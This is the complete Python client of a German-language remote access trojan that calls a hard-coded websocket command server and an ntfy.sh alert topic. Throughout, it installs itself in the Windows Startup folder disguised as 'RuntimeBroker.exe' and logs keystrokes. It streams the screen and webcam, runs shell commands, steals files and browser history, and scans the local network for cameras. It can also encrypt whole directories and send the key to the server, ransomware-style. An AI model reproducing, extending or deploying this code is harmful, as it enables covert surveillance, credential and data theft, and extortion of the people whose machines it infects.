import asyncio
import websockets
import json
import subprocess
import os
import base64
import mss
from PIL import Image
import io
import platform
import sqlite3
import shutil
import sys
import socket
import urllib.request
import glob
from datetime import datetime, timedelta
import logging
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import tempfile
import threading
import time

# --- Konfiguration & Globals ---
SERVER_URI = "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app:443/rat"
KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
NTFY_TOPIC = "RAT_JundN"
CHUNKED_UPLOADS = {}

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

# --- Optionales Modul: Keylogger ---
try:
    from pynput import keyboard
except ImportError:
    print("[!] pynput ist nicht installiert. Keylogger-Funktion nicht verfügbar.")
    keyboard = None

# === Hilfsfunktionen: System & Netzwerk ===
def get_public_ip():
    try:
        with urllib.request.urlopen('https://api.ipify.org', timeout=5) as resp:
            return resp.read().decode('utf8')
    except Exception as e:
        logging.warning(f"Fehler beim Abrufen der öffentlichen IP: {e}")
        return "Unbekannt"

def get_local_ips():
    try:
        hostname = socket.gethostname()
        return ", ".join(socket.gethostbyname_ex(hostname)[2])
    except Exception as e:
        logging.warning(f"Fehler beim Abrufen der lokalen IPs: {e}")
        return "Unbekannt"

CD_STATE_FILE = os.path.join(os.path.expanduser("~"), ".rat_last_cwd")

def save_cwd_state():
    try:
        with open(CD_STATE_FILE, "w", encoding="utf-8") as f:
            f.write(os.getcwd())
    except Exception:
        pass

def load_cwd_state():
    try:
        if os.path.exists(CD_STATE_FILE):
            with open(CD_STATE_FILE, "r", encoding="utf-8") as f:
                path = f.read().strip()
            if os.path.isdir(path):
                os.chdir(path)
    except Exception:
        pass

def get_free_space_mb(path="."):
    try:
        stat = shutil.disk_usage(path)
        return round(stat.free / (1024 * 1024), 2)
    except Exception:
        return "Unbekannt"

def get_system_info():
    try:
        try:
            user = os.getlogin()
        except Exception:
            user = os.environ.get("USERNAME") or os.environ.get("USER") or "Unbekannt"
        info = {
            "Benutzer": user,
            "Hostname": socket.gethostname(),
            "OS": platform.platform(),
            "Öffentliche IP": get_public_ip(),
            "Lokale IPs": get_local_ips(),
            "CPU": platform.processor(),
            "Architektur": platform.machine(),
            "Python-Version": platform.python_version(),
            "Arbeitsspeicher (MB)": round(os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024.**2), 2) if hasattr(os, 'sysconf') else "Unbekannt",
            "Freier Speicherplatz (MB)": get_free_space_mb(),
            "Aktuelles Verzeichnis": os.getcwd(),
        }
        return "\n".join(f"{k}: {v}" for k, v in info.items())
    except Exception as e:
        return f"Fehler beim Abrufen der Systeminformationen: {e}"

def send_ntfy_notification():
    try:
        system_info = (
            f"Neue RAT-Verbindung!\n"
            f"Benutzer: {os.getlogin()}\n"
            f"Hostname: {socket.gethostname()}\n"
            f"OS: {platform.platform()}\n"
            f"Öffentliche IP: {get_public_ip()}\n"
            f"Lokale IPs: {get_local_ips()}\n"
            f"RAT-URL: https://yawning-chameleon-norobb-e4dabbb0.koyeb.app"
        )
        req = urllib.request.Request(
            f"https://ntfy.sh/{NTFY_TOPIC}",
            data=system_info.encode('utf-8'),
            headers={
                "Title": "RAT Aktivierung",
                "Priority": "urgent",
                "Tags": "warning,skull"
            }
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        logging.warning(f"Fehler beim Senden der NTFY-Benachrichtigung: {e}")

def ensure_persistence():
    if platform.system() != "Windows":
        return
    try:
        startup_filename = "RuntimeBroker.exe"
        source_path = sys.executable
        startup_folder = os.path.join(
            os.environ["APPDATA"],
            "Microsoft",
            "Windows",
            "Start Menu",
            "Programs",
            "Startup",
        )
        dest_path = os.path.join(startup_folder, startup_filename)
        if source_path.lower() == dest_path.lower():
            return
        if not os.path.exists(dest_path):
            os.makedirs(startup_folder, exist_ok=True)
            shutil.copyfile(source_path, dest_path)
    except Exception as e:
        logging.warning(f"Fehler bei Persistenz: {e}")

# === Datei- und Verzeichnisfunktionen ===
def list_directory(path="."):
    try:
        entries = os.listdir(path)
        output = [f"Inhalt von {os.path.abspath(path)}:"]
        for entry in entries:
            full_path = os.path.join(path, entry)
            if os.path.isdir(full_path):
                output.append(f"[DIR]  {entry}")
            else:
                output.append(f"      {entry}")
        return "\n".join(output)
    except Exception as e:
        return f"Fehler beim Auflisten des Verzeichnisses: {e}"

def save_uploaded_file(filename, data_b64):
    try:
        with open(filename, "wb") as f:
            f.write(base64.b64decode(data_b64))
        return f"Datei erfolgreich gespeichert: {filename}"
    except Exception as e:
        return f"Fehler beim Speichern der Datei: {e}"

def change_directory(path):
    try:
        os.chdir(path)
        save_cwd_state()
        return f"Verzeichnis gewechselt zu: {os.getcwd()}"
    except Exception as e:
        return f"Fehler beim Wechseln des Verzeichnisses: {e}"

# === Verschlüsselung/Entschlüsselung ===
def encrypt_file(filepath, key):
    backend = default_backend()
    iv = secrets.token_bytes(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    with open(filepath, "rb") as f:
        data = f.read()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    ct = encryptor.update(padded_data) + encryptor.finalize()
    with open(filepath, "wb") as f:
        f.write(iv + ct)

def encrypt_directory(path):
    key = secrets.token_bytes(32)
    encrypted_files = []
    for root, _, files in os.walk(path):
        for file in files:
            try:
                full_path = os.path.join(root, file)
                encrypt_file(full_path, key)
                encrypted_files.append(full_path)
            except Exception:
                pass
    return key, encrypted_files

def decrypt_file(filepath, key):
    backend = default_backend()
    with open(filepath, "rb") as f:
        iv = f.read(16)
        ct = f.read()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ct) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    with open(filepath, "wb") as f:
        f.write(data)

def decrypt_directory(path, key_hex):
    key = bytes.fromhex(key_hex)
    decrypted_files = []
    for root, _, files in os.walk(path):
        for file in files:
            try:
                full_path = os.path.join(root, file)
                decrypt_file(full_path, key)
                decrypted_files.append(full_path)
            except Exception:
                pass
    return decrypted_files

async def send_encryption_key(websocket, key, path):
    msg = {
        "type": "encryption_key",
        "key_hex": key.hex(),
        "path": path
    }
    await websocket.send(json.dumps(msg))

# === Keylogger ===
def on_press_persistent(key):
    if not keyboard:
        return
    special_key_map = {
        keyboard.Key.enter: f" [<<<{datetime.now().strftime('%H:%M:%S')}>>>]\n",
        keyboard.Key.space: " ",
        keyboard.Key.backspace: "[BS]",
        keyboard.Key.tab: "[Tab]",
        keyboard.Key.ctrl: "[CTRL]",
        keyboard.Key.ctrl_l: "[CTRL]",
        keyboard.Key.ctrl_r: "[CTRL]",
        keyboard.Key.alt: "[ALT]",
        keyboard.Key.alt_l: "[ALT]",
        keyboard.Key.alt_r: "[ALT]",
        keyboard.Key.shift: "",
        keyboard.Key.shift_l: "",
        keyboard.Key.shift_r: "",
        keyboard.Key.cmd: "[CMD]",
        keyboard.Key.cmd_l: "[CMD]",
        keyboard.Key.cmd_r: "[CMD]",
        keyboard.Key.esc: "[ESC]",
        keyboard.Key.up: "[UP]",
        keyboard.Key.down: "[DOWN]",
        keyboard.Key.left: "[LEFT]",
        keyboard.Key.right: "[RIGHT]",
        keyboard.Key.delete: "[DEL]",
        keyboard.Key.insert: "[INS]",
    }
    log_entry = ""
    try:
        log_entry = key.char
    except AttributeError:
        log_entry = special_key_map.get(key, f"[{key.name}]")
    if log_entry:
        try:
            with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except Exception:
            pass

def start_persistent_keylogger():
    if not keyboard:
        return
    header = f"\n--- SESSION STARTED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n"
    try:
        with open(KEYLOG_FILE_PATH, "a", encoding="utf-8") as f:
            f.write(header)
    except Exception as e:
        print(f"[!] Fehler beim Schreiben des Log-Headers: {e}")
    listener = keyboard.Listener(on_press=on_press_persistent)
    listener.daemon = True
    listener.start()
    print(f"[+] Persistenter Keylogger gestartet. Log-Datei: {KEYLOG_FILE_PATH}")

# === Netzwerk-Kamerascan ===
def scan_network_cameras():
    import socket
    found = []
    ports = [554, 80, 8080, 81]
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        subnet = ".".join(local_ip.split(".")[:3]) + "."
    except Exception:
        subnet = "192.168.0."
    lock = threading.Lock()
    def check_ip(ip):
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                res = s.connect_ex((ip, port))
                s.close()
                if res == 0:
                    with lock:
                        found.append(f"{ip}:{port}")
            except Exception:
                pass
    threads = []
    for i in range(1, 255):
        ip = subnet + str(i)
        t = threading.Thread(target=check_ip, args=(ip,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=1.5)
    return found

# === Browserverlauf ===
def get_browser_history(limit=50):
    userprofile = os.environ.get('USERPROFILE', None)
    browsers = {
        "Chrome": {
            "windows": os.path.join(userprofile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History') if userprofile else "",
            "linux": os.path.join(os.path.expanduser('~'), '.config', 'google-chrome', 'Default', 'History'),
            "mac": os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Google', 'Chrome', 'Default', 'History')
        },
        "Edge": {
            "windows": os.path.join(userprofile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History') if userprofile else "",
            "mac": os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Microsoft Edge', 'Default', 'History')
        },
        "Firefox": {
            "windows": os.path.join(userprofile, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles') if userprofile else "",
            "linux": os.path.join(os.path.expanduser('~'), '.mozilla', 'firefox'),
            "mac": os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Firefox', 'Profiles')
        }
    }

    system = platform.system().lower()
    if system == "windows":
        system = "windows"
    elif system == "linux":
        system = "linux"
    elif system == "darwin":
        system = "mac"

    output = []
    
    for browser, paths in browsers.items():
        if system not in paths:
            continue
            
        db_path = paths[system]
        
        # Firefox benötigt spezielle Behandlung
        if browser == "Firefox":
            profile_paths = glob.glob(os.path.join(db_path, '*.default*'))
            if not profile_paths:
                continue
            db_path = os.path.join(profile_paths[0], 'places.sqlite')
        elif not os.path.exists(db_path):
            continue
            
        temp_db_path = f"{browser}_history_temp.db"
        try:
            shutil.copyfile(db_path, temp_db_path)
            
            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()
            
            if browser in ["Chrome", "Edge"]:
                query = f"""
                SELECT url, title, last_visit_time 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT {limit}
                """
            else:  # Firefox
                query = f"""
                SELECT url, title, last_visit_date 
                FROM moz_places 
                JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id 
                ORDER BY last_visit_date DESC 
                LIMIT {limit}
                """
            
            cursor.execute(query)
            results = cursor.fetchall()
            
            def convert_time(timestamp):
                if browser in ["Chrome", "Edge"]:
                    return (datetime(1601, 1, 1) + timedelta(microseconds=timestamp)).strftime('%d.%m.%Y %H:%M:%S')
                else:  # Firefox
                    return (datetime.fromtimestamp(timestamp/1000000)).strftime('%d.%m.%Y %H:%M:%S')
            
            browser_output = [f"\n=== {browser} Verlauf (letzte {len(results)} Einträge) ==="]
            for i, (url, title, visit_time) in enumerate(results, 1):
                try:
                    browser_output.append(
                        f"Eintrag {i}:\n"
                        f"  Zeit:    {convert_time(visit_time)}\n"
                        f"  Titel:   {title}\n"
                        f"  URL:     {url}\n" +
                        "-" * 40
                    )
                except Exception:
                    continue
            
            output.extend(browser_output)
            
        except sqlite3.Error as e:
            output.append(f"[FEHLER] {browser} Verlauf konnte nicht gelesen werden: {str(e)}")
        finally:
            if 'conn' in locals():
                conn.close()
            if os.path.exists(temp_db_path):
                os.remove(temp_db_path)
    
    return "\n".join(output) if output else "Keine Browserverläufe gefunden."

# === Fernsteuerung via pyautogui ===
def handle_pyautogui_control(cmd: dict):
    import pyautogui
    action = cmd.get("control_action")
    try:
        if action == "move":
            x, y = cmd.get("x"), cmd.get("y")
            pyautogui.moveTo(x, y)
        elif action == "click":
            x, y = cmd.get("x"), cmd.get("y")
            button = cmd.get("button", "left")
            pyautogui.click(x, y, button=button)
        elif action == "mousedown":
            x, y = cmd.get("x"), cmd.get("y")
            button = cmd.get("button", "left")
            pyautogui.mouseDown(x, y, button=button)
        elif action == "mouseup":
            x, y = cmd.get("x"), cmd.get("y")
            button = cmd.get("button", "left")
            pyautogui.mouseUp(x, y, button=button)
        elif action == "scroll":
            clicks = cmd.get("clicks", 0)
            pyautogui.scroll(clicks)
        elif action == "keypress":
            key = cmd.get("key")
            pyautogui.press(key)
        elif action == "keydown":
            key = cmd.get("key")
            pyautogui.keyDown(key)
        elif action == "keyup":
            key = cmd.get("key")
            pyautogui.keyUp(key)
        elif action == "type":
            text = cmd.get("text", "")
            pyautogui.typewrite(text)
        return {"status": "ok"}
    except Exception as e:
        return {"status": "error", "error": str(e)}

# === Screen Streaming (VNC-Style) ===
class ScreenStreamer:
    def __init__(self):
        self._task = None
        self._running = False
        self._fps = 10
        self._ws = None

    async def start(self, ws):
        if self._running:
            print("[ScreenStreamer] Bereits aktiv.")
            return
        print("[ScreenStreamer] Starte Streaming.")
        self._running = True
        self._ws = ws
        self._task = asyncio.create_task(self._stream())

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                print("[ScreenStreamer] Task abgebrochen.")
            except Exception as e:
                print(f"[ScreenStreamer] Fehler beim Stoppen: {e}")
            self._task = None
        print("[ScreenStreamer] Gestoppt.")

    async def _stream(self):
        sct = mss.mss()
        monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
        max_width, max_height = 1280, 720
        try:
            while self._running:
                img = sct.grab(monitor)
                im = Image.frombytes('RGB', (img.width, img.height), img.rgb)
                if img.width > max_width or img.height > max_height:
                    im.thumbnail((max_width, max_height), Image.LANCZOS)
                buf = io.BytesIO()
                im.save(buf, format='JPEG', quality=80, optimize=True)
                img_bytes = buf.getvalue()
                meta = {
                    'action': 'screen_frame',
                    'width': im.width,
                    'height': im.height
                }
                try:
                    await self._ws.send(json.dumps(meta))
                    await self._ws.send(img_bytes)
                except Exception as e:
                    print(f"[ScreenStreamer] Fehler beim Senden: {e}")
                    break
                await asyncio.sleep(1 / self._fps)
        except asyncio.CancelledError:
            print("[ScreenStreamer] Stream-Task abgebrochen.")
        except Exception as e:
            print(f"[ScreenStreamer] Fehler: {e}")

screen_streamer = ScreenStreamer()

# === Webcam Streaming ===
class WebcamStreamer:
    def __init__(self):
        self._task = None
        self._running = False
        self._ws = None
        self._fps = 5

    async def start(self, ws):
        if self._running:
            return
        self._running = True
        self._ws = ws
        self._task = asyncio.create_task(self._stream())

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except Exception:
                pass
            self._task = None

    async def _stream(self):
        try:
            import cv2
            import base64
            import asyncio
        except ImportError:
            await self._ws.send(json.dumps({"type": "command_output", "output": "cv2 (OpenCV) ist nicht installiert. Live-Webcam-Stream nicht möglich."}))
            return
        try:
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                await self._ws.send(json.dumps({"type": "command_output", "output": "Webcam konnte nicht geöffnet werden"}))
                return
            while self._running:
                ret, frame = cam.read()
                if not ret:
                    await self._ws.send(json.dumps({"type": "command_output", "output": "Kein Bild von Webcam erhalten"}))
                    break
                _, buf = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
                b64img = base64.b64encode(buf.tobytes()).decode("utf-8")
                meta = {"action": "webcam_frame"}
                await self._ws.send(json.dumps(meta))
                await self._ws.send(b64img)
                await asyncio.sleep(1 / self._fps)
            cam.release()
        except Exception as e:
            await self._ws.send(json.dumps({"type": "command_output", "output": f"Webcam Fehler: {e}"}))

webcam_streamer = WebcamStreamer()

def shutdown_or_restart(action):
    try:
        if platform.system() == "Windows":
            if action == "shutdown":
                os.system("shutdown /s /t 0")
                return "System wird heruntergefahren..."
            elif action == "restart":
                os.system("shutdown /r /t 0")
                return "System wird neu gestartet..."
        else:
            if action == "shutdown":
                os.system("shutdown -h now")
                return "System wird heruntergefahren..."
            elif action == "restart":
                os.system("shutdown -r now")
                return "System wird neu gestartet..."
        return "Unbekanntes System oder Aktion."
    except Exception as e:
        return f"Fehler beim Ausführen von {action}: {e}"

# --- Heartbeat/Ping ---
async def heartbeat(ws, interval=60):
    while True:
        try:
            await ws.send(json.dumps({"type": "ping"}))
        except Exception:
            break
        await asyncio.sleep(interval)

# === Hauptlogik: Kommandos ===
async def process_commands(websocket):
    async def send_status(msg):
        try:
            await websocket.send(json.dumps({"type": "client_log", "level": "info", "msg": msg}))
        except Exception:
            pass

    while True:
        try:
            message = await websocket.recv()
            if isinstance(message, bytes):
                continue
            command = json.loads(message)
            action = command.get("action")
            response = {"status": "ok"}

            if action == "screenstream_start":
                print("[Client] Screenstream Start angefordert.")
                await screen_streamer.start(websocket)
                await send_status("Screenstream gestartet.")
                response["type"] = "command_output"
                response["output"] = "Screen-Streaming gestartet."
                await websocket.send(json.dumps(response))
                continue
            elif action == "screenstream_stop":
                print("[Client] Screenstream Stop angefordert.")
                await screen_streamer.stop()
                await send_status("Screenstream gestoppt.")
                response["type"] = "command_output"
                response["output"] = "Screen-Streaming gestoppt."
                await websocket.send(json.dumps(response))
                continue
            elif action == "webcam_start":
                await webcam_streamer.start(websocket)
                await send_status("Webcam-Streaming gestartet.")
                response["type"] = "command_output"
                response["output"] = "Webcam-Streaming gestartet."
                await websocket.send(json.dumps(response))
                continue
            elif action == "webcam_stop":
                await webcam_streamer.stop()
                await send_status("Webcam-Streaming gestoppt.")
                response["type"] = "command_output"
                response["output"] = "Webcam-Streaming gestoppt."
                await websocket.send(json.dumps(response))
                continue
            elif action == "control":
                ctrl_result = handle_pyautogui_control(command)
                response.update(ctrl_result)
                response["type"] = "command_output"
                await websocket.send(json.dumps(response))
                continue

            if action == "exec":
                cmd_to_run = command.get("command")
                result = subprocess.run(
                    cmd_to_run,
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    errors="ignore",
                )
                response["type"] = "command_output"
                response["output"] = result.stdout + result.stderr

            elif action == "screenshot":
                try:
                    with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmpfile:
                        tmp_path = tmpfile.name
                    with mss.mss() as sct:
                        sct.shot(output=tmp_path)
                        with open(tmp_path, "rb") as img_file:
                            encoded_string = base64.b64encode(
                                img_file.read()
                            ).decode("utf-8")
                    os.remove(tmp_path)
                    response["type"] = "screenshot"
                    response["data"] = encoded_string
                except Exception as e:
                    response["status"] = "error"
                    response["type"] = "command_output"
                    response["output"] = f"Fehler beim Screenshot: {e}"

            elif action == "download":
                path = command.get("path")
                if os.path.exists(path) and os.path.isfile(path):
                    with open(path, "rb") as f:
                        file_data = base64.b64encode(f.read()).decode("utf-8")
                    response["type"] = "file_download"
                    response["filename"] = os.path.basename(path)
                    response["data"] = file_data
                else:
                    response["status"] = "error"
                    response["error"] = "Datei nicht gefunden oder ist ein Verzeichnis."

            elif action == "upload":
                filename = command.get("filename")
                data_b64 = command.get("data")
                response["type"] = "command_output"
                response["output"] = save_uploaded_file(filename, data_b64)

            elif action == "ls":
                path = command.get("path", ".")
                response["type"] = "command_output"
                response["output"] = list_directory(path)

            elif action == "systeminfo":
                response["type"] = "command_output"
                response["output"] = get_system_info()

            elif action in ("shutdown", "restart"):
                response["type"] = "command_output"
                response["output"] = shutdown_or_restart(action)

            elif action == "history":
                limit = command.get("limit", 50)
                response["type"] = "command_output"
                response["output"] = get_browser_history(limit)

            elif action == "keylogger":
                if not keyboard:
                    response["status"] = "error"
                    response["error"] = "pynput ist auf dem Client nicht installiert."
                elif not os.path.exists(KEYLOG_FILE_PATH):
                    response["type"] = "command_output"
                    response["output"] = "Keylog-Datei existiert noch nicht."
                else:
                    count = command.get("count", 1000)
                    with open(KEYLOG_FILE_PATH, "rb") as f:
                        f.seek(0, os.SEEK_END)
                        filesize = f.tell()
                        seek_pos = max(0, filesize - int(count * 1.5))
                        f.seek(seek_pos)
                        last_chunk = f.read().decode("utf-8", errors="ignore")
                        output = last_chunk[-count:]
                    response["type"] = "command_output"
                    response["output"] = (
                        f"Die letzten {len(output)} Zeichen aus der Log-Datei "
                        f"({filesize / 1024:.2f} KB):\n{output}"
                    )
            elif action == "cd":
                path = command.get("path", ".")
                response["type"] = "command_output"
                response["output"] = change_directory(path)
            elif action == "encrypt":
                path = command.get("path", ".")
                response["type"] = "command_output"
                try:
                    key, files = encrypt_directory(path)
                    await send_encryption_key(websocket, key, path)
                    response["output"] = f"Verschlüsselung abgeschlossen für {len(files)} Dateien im Verzeichnis {path}.\nSchlüssel wurde an den Server gesendet."
                except Exception as e:
                    response["output"] = f"Fehler bei Verschlüsselung: {e}"
            elif action == "decrypt":
                path = command.get("path", ".")
                key_hex = command.get("key_hex")
                response["type"] = "command_output"
                try:
                    files = decrypt_directory(path, key_hex)
                    response["output"] = f"Entschlüsselung abgeschlossen für {len(files)} Dateien im Verzeichnis {path}."
                except Exception as e:
                    response["output"] = f"Fehler bei Entschlüsselung: {e}"
            elif action == "scan_cameras":
                cams = scan_network_cameras()
                response["type"] = "command_output"
                response["output"] = "Gefundene Netzwerk-Kameras:\n" + ("\n".join(cams) if cams else "Keine gefunden.")
            else:
                response["status"] = "error"
                response["error"] = "Unbekannte Aktion"

            await websocket.send(json.dumps(response))
        except Exception as e:
            print(f"[Client] Fehler im Command-Handler: {e}")
            error_response = {"status": "error", "error": f"Client-Fehler: {e}"}
            try:
                await websocket.send(json.dumps(error_response))
            except Exception as e2:
                print(f"[Client] Fehler beim Senden des Fehler-Responses: {e2}")

# --- Haupt-Entry-Point ---
async def connect_to_server():
    ensure_persistence()
    load_cwd_state()
    start_persistent_keylogger()
    send_ntfy_notification()
    backoff = 5
    while True:
        try:
            async with websockets.connect(SERVER_URI) as websocket:
                logging.info("[+] Verbunden mit dem Server.")
                try:
                    msg = await websocket.recv()
                    if isinstance(msg, bytes):
                        msg = msg.decode("utf-8", errors="ignore")
                    data = json.loads(msg)
                    if data.get("action") == "systeminfo":
                        sysinfo = get_system_info()
                        await websocket.send(json.dumps({
                            "type": "command_output",
                            "output": sysinfo,
                            "hostname": socket.gethostname(),
                            "os": platform.platform(),
                            "ip": get_public_ip(),
                        }))
                except Exception as e:
                    logging.warning(f"Fehler beim Senden von Systeminfos: {e}")
                asyncio.create_task(heartbeat(websocket, 60))
                await process_commands(websocket)
                backoff = 5
        except (websockets.ConnectionClosed, ConnectionRefusedError) as e:
            logging.warning(f"Verbindung verloren: {e}")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 120)
        except Exception as e:
            logging.error(f"Allgemeiner Fehler: {e}")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 120)

if __name__ == "__main__":
    asyncio.run(connect_to_server())
    